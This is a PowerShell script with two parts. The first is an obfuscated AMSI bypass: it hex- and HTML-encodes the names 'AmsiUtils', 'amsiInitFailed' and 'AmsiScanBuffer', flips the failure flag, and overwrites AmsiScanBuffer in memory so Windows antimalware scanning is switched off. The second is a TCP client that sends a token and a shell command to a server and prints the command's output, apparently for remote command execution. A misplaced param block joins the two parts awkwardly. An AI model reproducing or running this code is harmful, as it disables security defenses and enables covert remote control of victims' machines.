[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

param(
    [string]$Host = "127.0.0.1",
    [int]$Port = 65432,
    [string]$Token = "mi_token_supersecreto",
    [string]$Cmd = "whoami"
)

$client = New-Object System.Net.Sockets.TcpClient
try {
    $client.Connect($Host, $Port)
} catch {
    Write-Error "No pude conectar a $Host:$Port - $_"
    exit 1
}
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($stream)

# send TOKEN and CMD lines
$writer.WriteLine("TOKEN: $Token")
$writer.WriteLine("CMD: $Cmd")

# read response header line
$header = $reader.ReadLine()
if ($header -eq "ERR") {
    $msg = $reader.ReadLine()
    Write-Error "Server error: $msg"
    $reader.Close(); $writer.Close(); $stream.Close(); $client.Close()
    exit 2
} elseif ($header -eq "OK") {
    $exitcode_line = $reader.ReadLine()
    $stdout_len_line = $reader.ReadLine()
    $stderr_len_line = $reader.ReadLine()
    $exitcode = [int]$exitcode_line
    $stdout_len = [int]$stdout_len_line
    $stderr_len = [int]$stderr_len_line

    # read raw bytes for stdout and stderr
    $buf = New-Object byte[] $stdout_len
    if ($stdout_len -gt 0) {
        $read = 0
        while ($read -lt $stdout_len) {
            $r = $stream.Read($buf, $read, $stdout_len - $read)
            if ($r -le 0) { break }
            $read += $r
        }
        $stdout = [System.Text.Encoding]::UTF8.GetString($buf, 0, $read)
    } else {
        $stdout = ""
    }

    $buf2 = New-Object byte[] $stderr_len
    if ($stderr_len -gt 0) {
        $read2 = 0
        while ($read2 -lt $stderr_len) {
            $r2 = $stream.Read($buf2, $read2, $stderr_len - $read2)
            if ($r2 -le 0) { break }
            $read2 += $r2
        }
        $stderr = [System.Text.Encoding]::UTF8.GetString($buf2, 0, $read2)
    } else {
        $stderr = ""
    }

    Write-Host "ExitCode: $exitcode"
    if ($stdout) { Write-Host "STDOUT:`n$stdout" }
    if ($stderr) { Write-Host "STDERR:`n$stderr" }
} else {
    Write-Error "Respuesta desconocida del servidor: $header"
}

$reader.Close(); $writer.Close(); $stream.Close(); $client.Close()
